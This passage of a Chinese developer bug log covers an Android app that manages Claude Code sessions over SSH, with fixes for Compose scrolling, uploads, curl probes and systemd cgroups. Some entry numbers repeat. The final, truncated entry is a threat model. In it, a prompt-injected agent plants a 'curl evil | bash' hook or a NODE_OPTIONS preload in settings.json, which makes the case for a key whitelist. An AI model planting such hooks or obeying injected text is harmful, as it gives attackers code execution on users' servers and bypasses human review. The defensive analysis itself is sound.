**发给服务端的也是重排后的串**。这等于把「码长什么样」这条**服务端的规则**
硬编码进了客户端。后来后台加了余额券，段长根本不一样，这个假设当场失效。

**修法**：原样收、原样发。只保留三件无争议的处理：转大写、去空白、限长度。
格式对不对**让服务端判**——它才是发码的人。

⚠️ **通用**：**别在客户端复制服务端的格式规则。** 客户端要么完全不认识（原样转发），
要么就得跟着服务端一起改；而后者永远会漏掉一次。
⚠️ 这类 bug 在自测里极难发现：**用自己编的示例码测，永远是对的**——
它长得就是你假设的那个样子。**一定要拿服务端真发的码测。**

## #247 「点 ↓ 完全没反应」：`when` 里两个空分支，离底部远时一下都不滚

**症状**（用户）：对话页右下角的 ↓（跳到最新）**点了没有任何反应**，画面纹丝不动。

**排查**：先分清是「按钮没显示」还是「显示了点着没用」。按钮的可见条件是
`items.isNotEmpty() && !stick && !listState.atBottom` —— 用户手动往上拖过（`stick=false`）、
且不在底部，条件成立，**按钮是显示的**。点击处理也在跑（`stick = true` + `scrollToEnd()`）。
问题在 `scrollToEnd()` 里：`grep -n "scrollToItem"` 整个 `app/src/main/kotlin` 只搜到**注释**，
**一个真正的调用都没有** —— 这就是实锤。

**根因**：#228 那次把 `scrollToEnd` 改写成 `when` 三支，第一支（看得见最后一条 → 只补差值）写了，
**另外两支留成了空 `{}`**，注释还在、代码没了。而 ↓ 按钮的使用场景恰恰是「离底部远、最后一条不可见」，
每次都落进空的 `else`，`repeat(30)` 空转 30 帧然后退出 —— 完美的静默失败。
跟随（`smooth=true`）在末尾刚滑出屏幕时也会卡在同样的空分支上。

**修法**：把两支填上 —— 远了 `scrollToItem(last, END_OFFSET)` 一次到位，
smooth 且只差几条时 `animateScrollToItem(last, END_OFFSET)`（滑过去，不是瞬移）。
`END_OFFSET = 100_000` 会被 Compose 夹到列表真正的末尾，长条目的尾巴也能露出来；
剩下的几十像素由第一支补齐。**第一支一个字没动 —— #228 的「只补差值不整块跳」原样保留。**

⚠️ **通用**：**`when` 的分支写成空 `{}`，编译器一个字都不说**（Kotlin 里合法，返回 `Unit`）。
重构时先把旧实现搬进新分支再改，别先搭骨架想着「回头填」。
⚠️ **通用**：查「点了没反应」先把「入口没出现」和「入口出现了但处理是空的」分开，
再顺着调用链 `grep` 那个函数**到底有没有真正干活的调用** —— 注释会骗人，调用不会。

## #248 分享多张图：文件全传上去了，界面却说「没送出去」

**症状**：用户从相册分享 9 张图进某个会话，看到的是**全部失败**，只好去终端里手动发。
但服务器上 9 个文件**一个不少**（文件名带的时间戳正是 App 的命名格式）。

**根因**：`ShareActivity.sendTo` 把「传文件」和「发消息」用**一个 `runCatching` 包住整段**，
`.getOrDefault(false)`。只要最后那一步 `SessionProbe.send` 抛了，整段就是 false，
界面只说一句「没送出去」——而文件其实早就传完了。

send 为什么会挂：分享页**借的是盯梢服务那条长连接**（`EventService.liveConn()`）。
SFTP 每次开新通道所以没事；`exec` 用的是同一条会话，空闲久了被服务器收掉，
表现是 `channel is not opened`（本机日志里见过）。

**修法**三条：
1. **上传和发送分开报**，每张图也各自 try —— 一张失败不拖垮其余的；
2. send 失败**换一条新连接重试一次**；
3. 文案说清到底成了几步：「9 个文件已经传上去了，但消息没发出去：… —— 直接在 App 里发一句就行，
   文件不用重传」。⚠️ 「没送出去」这四个字最坑：用户以为要重来，于是又传一遍，服务器上就有了两份。

⚠️ **通用**：**一个 `runCatching` 不要包住两件独立的事**。包住了，你就只能报「整件事失败」，
而用户需要知道的恰恰是「哪一步失败、前面那步的结果还在不在」。

## #249 `when` 分支留空 = 静默失败，编译器一个字都不说

**症状**：对话页的 ↓ 按钮（滚到最新）点了**毫无反应**。

**根因**：`scrollToEnd()` 是个三支 `when`，只有第一支「看得见最后一条 → 只补差值」有实现，
**另外两支是空 `{}`，只有注释没有代码**。而 ↓ 按钮的使用场景恰恰是「离底部远、最后一条不可见」，
每次都落进空的 `else`。0.9.98 修 #228 时把老实现改写成 `when` 骨架，只填了第一支。

实锤：`grep -rn "scrollToItem\|animateScrollToItem"` 在整个源码树里**只搜到注释，没有一个调用**。

**修法**：把两支填上（近的 `animateScrollToItem` 滑过去、远的 `scrollToItem` 一次到位，
都带一个大的 scrollOffset 让它停在真正的末尾）。#228 那一支原样没动。

⚠️ **通用**：**Kotlin 的空分支是合法的**，改写控制流时留下的空壳编译器不会提醒。
把一个函数从「几条语句」重构成「分支骨架」之后，**逐支确认都填了**——
最好的检查是搜一遍「这个函数本该调用的那个 API」在源码里还有没有真实调用。

## #250 会话里点开侧边栏关不掉

**症状**：在某个会话（工作区）里点 ☰ 打开侧边栏，**关不掉** —— 点外面没反应、往左滑也没反应，
得先退回首页才行（用户 2026-09-04 截图）。看板上却没这个问题。

**根因**：会话那一层的 `ModalNavigationDrawer` 写了 `gesturesEnabled = false`。
当初关掉是为了**开**：会话里从左边缘右滑归系统的「右滑返回」，两边抢会都不好使。
但 **Material3 里「点遮罩关闭」是跟 `gesturesEnabled` 绑在一起的** ——
一律 false 等于把「点外面关」和「滑动关」两条路一起掐了，只剩返回键。

**修法**：按状态给 —— `gesturesEnabled = drawer.isOpen`。
关着时禁（不跟系统返回手势抢），开着时放开（点外面 / 左滑都能关）。

⚠️ **通用**：**一个开关同时管着「开」和「关」两件事时，别用一个常量把它按死。**
你关掉的理由往往只针对其中一半，另一半是连坐的 —— 而连坐的那一半通常没人测。

## #251 先看素材，再定版式

**症状**：老板给了 9 张角色立绘，我让子代理切成竖版卡面（720×1000）。
他看到后说「我给你上传的图片，你不要截图、不要截一部分出来，要保证它是完整的」。

**根因**：**我从一开始就不该裁。** 我默认「卡牌就该是竖的」，于是给子代理下的任务就是「切成竖版」，
**从没量过原图是什么形状**。量了才知道九张全是 **16:9 横构图**（2752×1536 一类，比例 1.7917）。
竖版卡放横图，只有两条路：裁掉，或者留一大片黑边 —— 两条都不合要求。

**修法**：素材整张不裁只等比缩（960×536，九张合计 626KB，**比裁过的还小**）；
卡牌库从「两列竖版」改成「一列横版 16:9」；渲染从 `ContentScale.Crop` 改成 **`Fit`**
（容器和图本该正好对上，用 Fit 是为了万一有零点几的出入也绝不裁）。

⚠️ **通用一**：**先看素材，再定版式，别反过来。** 版式是可以改的，别人给的原图不是。
⚠️ **通用二**：派活给子代理时，**你给的验收判据里藏着你的假设**。
这次子代理还自己发现我给的判据（亮像素边界框）不成立并换了更好的 ——
但它没法质疑「为什么要裁」，因为那是我下的任务本身。**任务本身错了，执行得再好也是错的。**

## #252 `dev/i18n-check.sh` 看不见 `t(变量)`，这类文案漏翻不会有人告诉你

**症状**：给装扮加了终端配色 / 气泡配色的名字（`Skins.Term` / `Skins.Bubble` 的 `label`），
`dev/i18n-check.sh` **一条都没报**。看着像「全都翻过了」，实际 [En] 里一条都没有 ——
切到英文，那几个名字仍然是中文。

**根因**：`i18n-check.sh` 是**纯文本扫描**，只认得字面量 `t("…")`。
而这类枚举/表的标签走的是 `t(zh)` —— `zh` 是构造参数，**扫描器看不见它的值**。
这不是谁忘了写，是**工具本身的盲区**。同一个盲区已经在下面这些地方存在：

- `Skin.Style.label`（浅色 / 深色）
- `SessionState.label`
- `Skins.Term.label` / `Skins.Bubble.label` / `Skins.Pack.label`（2026-09-04 新增）

漏翻的表现是**那句仍然显示中文，不崩不空** —— 所以没人会来报 bug，只会觉得「这 app 英文没做完」。

**修法 / 怎么避开**：**凡是把中文原文当构造参数传的（`private val zh` 这一类），
加了新条目就必须手动补 [En]**，别指望 `i18n-check.sh` 提醒你。
写这类枚举/表的时候顺手在旁边留一句注释，把要补的 key 列出来。

⚠️ **通用**：**检查工具报「没问题」，只代表它检查过的那部分没问题。**
用一个静态扫描器当验收判据之前，先问它看得见什么 ——
它看不见的地方，恰恰是最容易长期烂着没人发现的地方（因为「工具说没事」）。

## #253 配色小样压暗之后，「琥珀」和「青」变成同一坨灰

**症状**：装扮分栏里未拥有的终端配色，小样全是灰的 —— 五套颜色看不出差别，
预览等于没做，人也就不知道自己想要哪套。

**根因**：照抄了卡牌库「未获得 → 去饱和 + 压暗 0.34」那套。
卡牌库压的是**画**，轮廓还在，一眼认得出是哪张；配色小样压的是**颜色本身**，
而颜色就是这东西的全部内容 —— 压掉颜色 = 把商品盖住卖。

**修法**：小样一律**原色显示**，「有没有」交给右边那行字（未拥有 / 使用中）和「点不动」。

**通用规律**（cc-Yxi_pilot 补，2026-09-04）：**「未拥有就压暗」只在轮廓是识别依据时成立。**
当那个属性本身就是商品（颜色、音效、时长），压暗等于把商品盖住卖 ——
锁定状态该由旁边的字和「点不动」承担，**不该由商品本身承担**。
下次上音效 / 动效类奖品，先问一句「我压掉的是识别依据，还是商品本身」。


## #254 靠「删掉 key」取消 env 配置是不生效的 —— 界面说切了，其实没切

**症状**：改 `~/.claude/settings.json` 的 `env` 换 Claude Code 的端点（`ANTHROPIC_BASE_URL`），
**换过去是立刻生效的**；但想换回来、把这个 key 从文件里**删掉**之后，
运行中的会话**仍然在用旧端点**。而界面（或脚本）这时已经显示「已切回默认」。

**根因**：Claude Code 会监听 settings 文件并热重载，`env` 块**在热重载范围内**
（只有 `model` / `effortLevel` / `modelSettings` / `outputStyle` 是「启动时读一次」）。
但热重载做的是**把文件里的 env 灌进进程环境**，**不做删除** ——
文件里没有了，进程环境里那个旧值还在，于是继续生效。

**实测**（2026-09-04，隔离探针会话：独立目录 + 项目级 `.claude/settings.local.json`，
不影响机器上其它会话）：

| 动作 | 结果 |
|---|---|
| 往 `env` 加一个变量 | 运行中的会话**立刻**读到 |
| `ANTHROPIC_BASE_URL` 改成坏地址 | 下一次请求 Connection refused（**换端点不用重启**） |
| 把这个 key **删掉** | **仍然是坏地址** ← 就是这条 |
| 显式改回官方端点 | 恢复正常 |
| 改成**空字符串** `""` | 恢复正常（**空串 = 恢复默认，也是热的**） |
| 请求已经在飞（重试链里） | 整条链走旧配置，切换落在**下一次**请求上 |

**修法**：**凡是靠改 `env` 做切换的代码，每次都要把这套 key 全写一遍，
「不设」写成空字符串 `""`，一个都不许省略。**
`agent/Lines.kt` 的 `apply()` 就是这么写的，那里也明确写了「别用 `remove()`」。

⚠️ **通用**：**「设置」和「取消设置」不一定走同一条路。**
一个配置能热更新，不等于它能热**删除** —— 加和减是两个动作，只验了加就当减也行，
出来的 bug 长成「界面说做了、实际没做」。**这是最难查的一类**，因为所有日志都显示成功。
凡是有「恢复默认 / 关掉 / 取消」这条路径的功能，**那条路径要单独验一次**，
不能从「设置成功」推出来。

## #255 在输入框里翻自己的草稿，翻的却是上下栏（栏收了、字没动）

**症状**：草稿写了一大段（超过 7 行），想上下滑看看前面写了什么 —— 结果页眉和底栏
收起来了，输入框里的字一行没动。只能把键盘调出来、靠光标挪才看得到后半截。

**根因**：输入框（`ChatScreen.kt` 的 `GlassPill`）是**那个挂着 `nestedScroll(barsConn)`
的 Box 的子节点**。`BasicTextField` 内部真的有一层 `scrollable`（Compose 的
`CoreTextField` 挂了 `textFieldScrollable`，字节码里能查到），它滚的时候会把 delta
**往上派发**给最近的父连接 —— 也就是收栏那条。于是「在输入框里滚」被当成「在列表里滚」。

**修法**：`barsConn.onPreScroll` 加一道 `if (!listState.isScrollInProgress) return Zero`
—— **只认列表自己在滚**。列表拖拽一开始这个标志就为真，能干净地把两者分开。

**一般规律**：`Modifier.nestedScroll` 收的是**整棵子树**的滚动，不只是你心里想的那个列表。
凡是往一个 nestedScroll 容器里塞了别的可滚组件（输入框、横向 chip 条、内嵌 WebView），
都要问一句「我这个连接会不会把它们的滚动也算进来」。判据要用**滚动源的身份**
（isScrollInProgress / source），不能只看方向和距离 —— 那两样两边长得一模一样。

## #256 「进了某一页，点底部导航纹丝不动」—— 同一个 bug 复发三次

**症状**：在会员中心 / 工单中心 / 趋势 / 邮件 / 祈愿 / 活动中心里点底部导航，页面不跳。

**根因**：**不是逻辑错，是结构错。** 七个整页各有一个 `var xxx by remember { false }`，
外加两处**手写的汇总** —— `val overlay = a || b || …` 和 `fun closeOverlays()`。
加一页要记得改三处，漏一处就复发，而且漏掉的那一页自己看起来完全正常。
2026-09-04 修过两次（第一次只有会员中心，第二次补了六个新页），2026-09-05 又被报一次。

**修法**：收敛成**一个状态** `var page by remember { mutableStateOf<Page?>(null) }`。
加一页 = 加一个枚举值 + `when` 里加一支，**编译器替你数**（`when` 不穷尽就报错），
没有第二处要同步。底部导航改成无条件 `page = null; work = null; tab = t`。

**一般规律**：**同一个 bug 修第三次的时候，要修的不是它，是让它能反复回来的那个结构。**
判据很好认：修法是「记得在 X 处也加一行」= 迟早还会漏。把「记得」换成「编译器不让你忘」。

## #257 钱的格式化写了三份，错了两份 —— 而且第三份从 bug 现场数不出来

**症状**：余额可以是负数（撤销兑换券会扣穿）。负余额显示成 `¥-55.00`，
应该是 `-¥55.00` —— 货币符号和负号的顺序是约定，写反了像是这笔钱本身叫「-55」。

**根因**：同一个语义（分 → 人民币）在三处各写一份：
`ui/SettingsScreen.kt`、`ui/RedeemSuccess.kt`、`agent/Account.kt`（**private，在另一个包**）。

**修法**：只留 `agent/Account.kt` 那一份（`internal fun yuan`），修好负号，另两处调它。
放 agent 层是**依赖方向**决定的：agent 不能反过来 import ui。

**一般规律**（cc-Yxi_pilot）：**这类收敛做完，要再 grep 函数名本身（`fun yuan`），
不是 grep 使用现场。** 从现象出发只能找到「出问题的那几处」；
另一个包里的 private 同名函数不会出现在任何一条错误路径上，但它就是第三份。
**「同一个语义各写一份」的真实份数，往往比你从 bug 现场数出来的多一份。**

## #258 功能做好了，用户说「怎么还没做」—— 名字起的是维度，不是动作

**症状**：会话看板顶栏那颗按钮写着「目录」，点开是按每一级祖先目录筛选（
`/root` → `/root/src` → `/root/src/workspace`，各带会话数、按层级缩进、按主机记住）。
用户 2026-09-05：「我之前说的筛选功能怎么到现在还没看到」—— 而那颗按钮**就在他截图里**。

**根因**：**他要找的是动作（筛选），看到的是维度（目录）**，于是从没往那儿点过。

**修法**：功能一行没改，只把默认标签改成「筛选」。
⚠️ 试过配个漏斗图标 —— 顶栏那排本来就刚好排满，加了图标「筛选」被挤得只剩一个「筛」
（英文 `Filter` 更宽）。**词比图标要紧**，图标撤了。

**一般规律**：用户报「这个功能没做」时，先确认**是没做，还是没找到**。
入口的名字该用**用户会去找的那个词**（动作），不是**实现里的那个词**（维度）。

## #259 想要「边说边出字」，但手里的模型是离线模型 —— 别为它再下一个模型

**需求**：用户 2026-09-05：「语音输入改成流式，我说多少它识别以后就跳出来，
这样我可以看到有没有讲错话。」

**卡点**：我们用的 **SenseVoice-Small 是离线（非流式）模型** ——
它没有「接着上次往下解」这回事，`OfflineRecognizer` 每次都得从头解整段。
真流式要换 online zipformer transducer，那是**再下一个几百 MB 的模型**
（SenseVoice 本身已经要下 153MB），为了看一眼自己说错没有不值得。

**做法**：**滚动重解** —— 录着的时候反复把「到目前为止」的整段音频解一遍当临时结果。
配套三条，缺一条就会出问题：
 1. **自限速**：这一拍解了多久，就至少歇多久（`delay(max(700, spent))`）。
    固定间隔的话，音频越长解码越慢 → 越积越多 → 手机发烫、字反而越来越滞后。
    「花多久歇多久」让它自己降频：短句一秒好几拍，长录音自动稀疏下来。
 2. **`tryLock` 不排队**：正解着就跳过这一拍。排队的话，停止录音之后
    还得等前面积压的几拍解完才出最终结果。
 3. **临时结果失败要安静**：中途弹「识别失败」只会打断人说话。
    真正那次识别（`transcribe`）照常报错。

**界面上**：临时结果用**淡色**，因为它会随着你继续说而**整句变化**（不是往后追加）——
颜色要让人一眼知道「还没定」。溢出时留住**后面**的字（`StartEllipsis`）：正在说的那半句比开头要紧。

**一般规律**：需求说「要流式」，不等于必须换成流式模型。
先问「我现有的东西反复跑一遍，够不够看」——够的话，代价只是 CPU，而 CPU 可以自限速；
换模型的代价是几百 MB 和一整条下载/校验/存储的链路。


## #260 `curl ... || echo 000`：把连不上的端点报成「通」

**症状**：线路页换完线，提示写着「通（HTTP **000000**）」——
而那个端点是 `http://127.0.0.1:1`，**根本连不上**。E2E 实测抓到的（2026-09-05）。

**根因**：探测命令原来是

```
curl -sS -o /dev/null -m 8 -w '%{http_code}' "$url" 2>/dev/null || echo 000
```

curl **连不上时自己就会**把 `%{http_code}` 输出成 `000`，**同时**退出码非零（实测 7）。
于是 `|| echo 000` 又补一个，拼成 `000000`，而判据写的是 `code == "000"` ——
判不出来，落到 else 分支，**把死端点报成「通」**。

实测两端行为：
- 死端点 `http://127.0.0.1:1` → 输出 `000`，退出码 **7**
- 活端点 `https://api.anthropic.com` → 输出 `404`，退出码 **0**

**修法**：去掉 `|| echo 000`，判据改成 `code.isBlank() || code.startsWith("000")`。
`000` 是 curl 表示「压根没连上」的约定值，本来就够用，不需要再补。

⚠️ **通用一**：**别给一个已经会输出错误标记的命令再加兜底输出。**
兜底和它自己的输出会**叠加**，把你要比对的那个值改成一个你没预料的形状。
写 `|| echo X` 之前先问：失败的时候它自己已经打了什么？

⚠️ **通用二**：这个 bug 编译器不管、代码审也看不出来（那行 shell 一眼很合理），
**只有真的拿一个连不上的地址跑一次才会现形**。
凡是「探测 / 健康检查 / 连通性」这类功能，**验收必须包含一次真实的失败用例** ——
只验成功路径，等于只验了「它会说通」。

## #261 「一闪一闪 + 跳到很久很久以前的对话记录」—— 三条独立的因，凑成同一个画面

**症状**（用户 2026-09-05 实拍）：从看板返回后再进某个会话、或从后台切回，对话页反复闪烁，
最后停在几天前的内容上；顶栏的模型从 `opus-5` 变成 `opus-4-8`、上下文从 765K 变成 934K。

三条因都真实存在，**修一条不够**：

### ① 把「一个空转周期」当成「历史灌完了」（主因）

`ChatScreen.kt` 的刷新协程里：`if (batch.isEmpty()) { …caughtUp = true… }`。
但**收行的 collect 和这个 300ms ticker 跑在同一个主线程上** —— 每批刷新都要整体换 `items`
（几百条重组重布局）+ 追底动画，主线程一被占住，行就塞不进 `pending`，ticker 反倒先被派发。
于是空转周期在灌历史途中**必然频繁出现**。
后果：一份**起点在 400 行前、结尾停在半路**的残缺快照被当成正式内容摆上屏，
**而且写进了 ChatMemory** —— 所以退回看板再进，看到的还是它，自愈不了。
顶栏那两个数也是从这份残缺快照里解出来的（400 行前那条 assistant 消息的 `usage` 和 `model`），
这就是模型芯片变旧的原因。

**修法**：判据从**猜时序**改成**数字节**。`tailStart` 本来就返回 `(文件大小, 起点)`，
两数一减就是「这趟要灌多少」；吃够了才叫灌完。空转兜底保留但要**连着四拍**（≈1.2s）。

### ② 分组行的 key 会凭空消失，滚动锚点跟着丢

`ChatRow.Group.key` 原本是 `"group-" + calls.first().key`。两条路都会让它变：
· 历史**往前灌**，同名工具的连续段往前长 → `first()` 变了；
· 60 行窗口里边界上的 `tool_use` **配不到 `tool_result`**（`result == null`）→ 不合组、是三行独立的
  `One`；400 行齐了才合成一组 → 那三个 key 一个不剩。
LazyColumn 的滚动锚点是**靠 key 找上一帧的首可见项**的，找不到就退回按下标定位 ——
下标一样、内容差了几百条，就落到几天前。

**修法**：`key = calls.last().key`，**而且不加前缀**。往前灌时最后一条不变；
不加前缀则合组前后至少最后那条的 key 是同一个，锚点接得住。

### ③ 排队条目的 key 用了队列下标

`"queued-$i-…"` 里的 `i` 是在整个队列里的位置 —— 队头一出队，**后面每条的 key 全变**。
次生后果：`headLastKey` 取的是 head 最后一条，它要是排队条目，就**永远匹配不上**，
只能落到 ① 的兜底分支。改成按**内容**编号（同样的话出现第几次）。

**一般规律**（这条比三个修法都值钱）：
- **「一段时间没动静」不是「做完了」。** 凡是能数出确定量（字节数、行数、总数）的地方，
  就别用超时去猜 —— 尤其当**生产者和判定者在同一个线程上**：判定者被生产者饿着的时候，
  恰恰最像「没动静了」。
- **列表 key 里不许出现「它在列表里的位置」，也不许出现「会被后续数据改变的派生属性」**
  （这里是「合没合组」，而合组取决于 `result` 有没有回填）。key 要么是内容自带的 id，
  要么是从内容算出来的稳定值。key 一变，滚动位置、进入动画、组合状态全跟着塌。

## #262 同一个 bug 派两个子代理独立查，查出来的不是同一条

修 #261 时派了两个子代理，一个查加载链、一个查滚动与重组。
**两个都对，但主因判断不同**：一个认定是分组 key（②），另一个认定是 `caughtUp` 兜底（①）。
我自己先查到的是 ②，而且只修了一半（只想到「往前长」，没想到「`result == null` 不合组」那条）。

**结论**：这类「现象一个、成因多条」的 bug，**别在找到第一个能自圆其说的原因时收手**。
判据不是「这条能不能解释现象」（往往能），而是「**把它修掉之后，另外那几条还在不在**」。
派多个视角互不知情地查，比让一个人查两遍有效 —— 第二遍会顺着第一遍的思路走。

## #263 模拟器每 15 秒必死，日志干干净净 —— 是 systemd 的 cgroup，不是 OOM 也不是 App

**症状**：无头模拟器起来之后十几秒就没了。`emulator.log` 停在「Boot completed」、
logcat 里没有任何崩溃、内存和负载都很宽裕。表现极像「App 一进对话页就把模拟器带走」，
查代码完全没有方向。

**根因**：这台机器上整棵 tmux / claude 进程树都活在 **`cloud-watchdog.service` 的 cgroup** 里
（它就是负责把歇掉的会话拉回来的那个守护进程），而 **`cloud-watchdog.timer` 每 15 秒触发一次**。
那个 unit 每次跑完停下来，systemd 就把 cgroup 里的「残留进程」清掉 ——
从会话里 `nohup` 起的模拟器正好算残留。journalctl 里的原话：

    cloud-watchdog.service: Unit process NNNN (qemu-system-x86) remains running after unit stopped.

⚠️ `nohup` / `setsid` **都挡不住** —— 它们改的是信号和会话，不改 cgroup 归属。

**修法**（已进 `dev/avd.sh`）：用 systemd 起，落进自己的 scope：

    systemd-run --scope --collect --quiet --unit=yxi-avd-$$ emulator ...

验证：`cat /proc/$(pgrep -f 'qemu-sys[t]em'|head -1)/cgroup` 应该是 `yxi-avd-*.scope`，
不是 `cloud-watchdog.service`。实测：修前空转 15 秒必死，修后空转 60 秒稳。

**一般规律**：**长期后台进程要问「它落在谁的 cgroup 里」**，尤其在有 systemd timer
反复拉起同名 unit 的机器上。这类死法有个很好认的指纹：**进程消失但所有应用层日志都正常收尾**
—— 应用日志里找不到原因时，去 `journalctl` 里按进程名搜，systemd 会明说是它干的。
（cc-Yxi_pilot 上一轮 E2E 也撞过一次，当时归因成 OOM，是错的。）


## #256 `LaunchedEffect` 在自己体内改自己的 key，异步工作被静默取消

**症状**：线路页「忙时排队切」这条路：会话空闲后横幅消失、没有任何成功/失败提示，
**服务器上什么都没写**。第一轮独立审查（Opus 5）从代码推出来的，逻辑上必然发生。

**根因**：

```kotlin
LaunchedEffect(busy, pending, pendingDefault) {
    if (busy == 0 && pending != null) {
        val target = pending
        pending = null            // ← 改了自己的 key
        doApply(target)           // ← suspend，里面是 SSH 写，要几百毫秒
    }
}
```

`pending` 是这个 effect 的 key。体内把它置空 → 下一帧重组 → Compose 看到 key 变了 →
**取消旧 effect 的协程、启动新的**。`doApply` 在第一个挂起点（`withContext(IO)`）就被取消，
SSH 写根本没发出去。新 effect 里 `pending == null`，什么都不做。
**所有日志都干净**，因为没有任何一步「失败」—— 它只是被取消了。

**修法**：effect 体内只做「取快照、置空」，真正的工作丢给 `rememberCoroutineScope().launch { … }` ——
那个 scope 跟 effect 的生命周期无关，key 变了它照跑。同一文件里非排队那条路本来就是这么写的。

⚠️ **通用**：**`LaunchedEffect` 体内要改状态的话，先看那个状态是不是自己的 key。**
是的话，这行之后的所有 suspend 调用都可能被取消，而且**不报错、不打日志**。
要么把工作丢进独立 scope，要么不要把「会在体内改的状态」当 key。
这条跟 #245（`DefaultSSLContextImpl` 失败被永久缓存）是同一类：**框架替你做了一个决定，
而这个决定在任何日志里都不留痕**。

## #264 模拟器一进对话页 35~40 秒必 SIGSEGV —— 换渲染后端也一样，跟 App 无关

**症状**：修完 #263（cgroup）之后模拟器空转稳了，但只要 App 进任何一个会话的对话页，
35~40 秒后 qemu 整个没了，`emulator.log` 里没有任何错误。

**证据**：`strace -f -p <qemu> -e trace=signal` 抓到 **所有线程 `killed by SIGSEGV (core dumped)`**
—— 是 qemu 自己段错误，不是被谁杀的。`GPU=guest`（客户机侧软渲染）和默认的
`swiftshader_indirect` **都一样**，所以不是渲染后端。
**A/B**：把这批改动全部拿掉的上一版 APK **同样复现** → 不是我们的代码。
（会话大小无关：373MB 的 Yxi 和 2.5MB 的 omggrow_acquire 都一样。）

**结论**：这台机器上的模拟器（37.1.11 + android-34 x86_64 镜像）**跑不了对话页**，
对话页的 E2E 只能在真机上做。看板 / 我的 / 祈愿 / 配置这些页面照常可用。
猜测跟对话页那几条长连的 SSH 流（`tail -f` + 心跳）经过 netsim 有关，没有再往下查 —— 
**证明「不是我们的代码」之后就该停**，修 qemu 不是这个项目的活。

## #265 换模型 / 思考强度：三条路的真实语义（一次性会话实测，别靠猜）

用户 2026-09-05：「切换模型选单延迟很高…有没有更好的切换方式，比如直接修改而非利用 /model」。
用一次性会话（`/tmp/modelprobe*.sh`）实测了三条路：

| 路 | 快不快 | 影响范围 | 备注 |
|---|---|---|---|
| 开 `/model` TUI 选单 → 挪光标 → `s` | 慢（抓屏 4 次，1~4 秒） | **只这个会话** | 原来芯片点开走的就是它 |
| `/model <名字>` | 快（两个来回） | 这个会话 **+ 写进 settings.json 当账号默认** | 有对话缓存时弹「Switch model?」确认框，**要补一个 Enter** |
| `/effort <级别>` | 快（一个来回） | 这个会话 **+ 账号默认**（回显明说 saved as your default） | haiku 不显示 effort |
| 直接改 `~/.claude/settings.json` / 项目级 `settings.local.json` 的 `model`、`effortLevel` | — | **对跑着的会话不生效** | 只有 `env` 那段会热加载（#254） |

**所以**：「直接改文件」这条路对运行中的会话根本没用，能走的快路只有斜杠命令，
而它**一定会改账号默认**——界面上必须把这句写在按钮旁边，不能藏。
`/model X` 之后**必须补 Enter**：不补的话那个确认框一直开着，用户下一条消息会被它吃掉
（探针里那条「ok」就是这么没的）。ModeSheet 原来的「Opus 5 · 1M」芯片就带这个毛病，现在统一走 `Model.switchFast`。

**一般规律**：斜杠命令的**副作用**（改不改默认、弹不弹框）只有跑一遍才知道，回显文字就是契约
—— 把它记下来比把它推理出来可靠。

## #266 看板上会话从「等你 / 干活中」变回「空闲」晚两分钟

**症状**（cc-Yxi_pilot 2026-09-05 E2E 抓到两次，带时间戳）：
`~/.claude/sessions/*.json` 07:04:16 已经是 idle，看板到 07:06:20 才跟着变。
「忙时排队切线路」因此看起来像卡住了两分钟。

**根因** `SessionProbe.kt`：合并两个状态源时写的是 `ccStates[name] ?: states[name]`，
而解析 Claude Code 那份时 **idle 直接 `return`、不往 `ccStates` 里放条目** ——
于是 `?:` 退回到 `~/.cloud-status`（cc-state）的旧值，它要等下一个 hook 事件才翻。

**修法**：idle 也记一条（state 留空 → `SessionState.of` 给 Idle）。**显式的 idle 必须赢过回退。**

**一般规律**：`a ?: b` 这种「首选源没有就退回次选源」的写法，要问清楚**「没有」和「明确说没事」是不是同一回事**。
这里首选源明确说了「闲着」，却因为被编码成「没条目」而被当成「不知道」，把话语权让给了过期的次选源。

## #267 「上传视频经常失败」—— 整个文件先读进内存再传

**症状**（用户 2026-09-05）：图片偶尔、视频经常传不上去，没有明白的报错。

**根因**：对话页附件和「分享到 Yxi」两条路都是 `openInputStream(uri).readBytes()` 把**整个文件读成一个
ByteArray** 再交给 jsch。一段视频就是一次几百 MB 的分配（App 堆一共 256~512MB，读的过程还会再复制一遍），
要么 OOM、要么被系统杀，表现就是「传不上去」。图片小看不出来，视频一上就炸。
jsch 的 `put` 本来就吃 `InputStream`，中间那份 ByteArray 纯属多余。

**修法**：`Sftp.write` / `Attachments.upload` 加流式重载，边读边传；大小用 `openAssetFileDescriptor(uri).length`
只为算进度。重试时**重新开流**（上一次失败时流可能读到一半）。

**压力测试**（`app/src/androidTest/.../UploadStressTest.kt`，走真 SSH 到宿主机，`sftp.size` 核对一字不差）：
64KB / 2MB / 16MB / 64MB / **160MB** 逐档 + 6 个文件并发各开一条通道 × 3 轮，全过。
模拟器 NAT 上约 3 MB/s，160MB 用 53 秒。
⚠️ 跑法上的两个坑：`connectedAndroidTest` 每次**重装 App**，KeyManager 的密钥跟着换 → 测试用一把固定密钥；
/sdcard 在分区存储下 App **读不到** → 私钥走 instrumentation 参数（base64url）进来：
`-Pandroid.testInstrumentationRunnerArguments.stressKey=$(base64 -w0 ~/.ssh/yxi-stress | tr '+/' '-_')`。

**一般规律**：凡是「文件 → 网络」的路径，**中间不许出现整文件的 ByteArray**。它在小文件上永远不会暴露，
在用户第一次传视频那天准时炸。

## #268 页眉收起了，状态芯片那条还杵在顶上

**症状**：对话页往上滑，页眉（标题 / 四个标签）收起来了，「模式 / 模型 / 最大思考 / 上下文」那排芯片不动。

**根因**：页眉在 Workspace 里按 `barsFrac` 平移；芯片那排在 ChatScreen 的 Column 里，不在页眉里，
只是 `padding(top = headerDp)` 给页眉让了位 —— 它从来没接过 `barsFrac`。

**修法**：`Modifier.collapseBy(frac)`：**布局高度**按 frac 缩到 0 + 淡出。
⚠️ 不能只用 `graphicsLayer` 平移：那不改布局，列表不会跟着上来，顶上会留一条空带。


## #257 线路能写进 settings.json 的键必须是白名单 —— 否则「手机上点一下换线」= 给服务器装钩子

**症状**（第一轮安全审查推演，代码路径确认无守卫）：线路 v2 允许一条线路携带整段 settings 片段。
`~/.yxi/lines.json` **服务器上的 agent 能写**（SECURITY.md 里定的信任边界）。被提示词注入的 agent 往某条线路的 `extra`
塞 `{"hooks":{"SessionStart":[{"command":"curl evil | bash"}]}}` 或 `env.NODE_OPTIONS=--require=/tmp/x.js`，
用户在手机上点「换到这条线路」→ `apply()` 原样写进 `settings.json` → Claude Code 热重载 hooks / 下次启动吃 NODE_OPTIONS
→ **任意代码执行**。用户以为自己只是换了个 API 端点。「人在手机上把关」这个产品的意义被整个绕开。

**根因**：把「用户能配的」和「文件里能写的」当成了一回事。CC Switch 是桌面单机工具，它写自己电脑的文件；
